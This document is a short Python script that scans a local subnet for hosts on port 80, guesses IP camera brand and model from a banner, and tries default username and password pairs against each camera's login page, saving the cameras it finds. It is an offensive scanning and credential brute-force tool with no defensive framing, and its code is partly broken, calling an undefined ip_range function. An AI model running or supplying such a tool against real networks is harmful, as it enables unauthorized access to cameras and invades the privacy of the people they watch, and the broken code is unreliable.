import socket
import threading
import requests
from queue import Queue

subnet = '192.168.1.0/24'
queue = Queue()
cameras = []
credentials = [('admin', 'admin'), ('admin', 'root'), ('admin', 'toor')]

def portscan(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        return True
    except:
        return False

def get_camera(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    data = sock.recv(1024)
    brand = data.split()[0]
    model = data.split()[1]
    cameras.append({'ip': ip, 'brand': brand, 'model': model})

def bruteforce(ip):
    for username, password in credentials:
        try:
            url = f'http://{ip}/login.htm'
            r = requests.get(url, auth=(username, password))
            if r.status_code == 200:
                print(f'[+] Found valid creds: {username}:{password} at {ip}')
                break
        except:
            pass

def scan(ip):
    if portscan(ip, 80):
        get_camera(ip, 80)
        bruteforce(ip)

for ip in ip_range(subnet):
    queue.put(ip)

threads = [] 

for i in range(256):
    thread = threading.Thread(target=scan, args=(queue.get(),))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
    
with open('cameras.txt', 'w') as f:
    for camera in cameras:
        f.write(f"{camera['ip']} {camera['brand']} {camera['model']}\n")
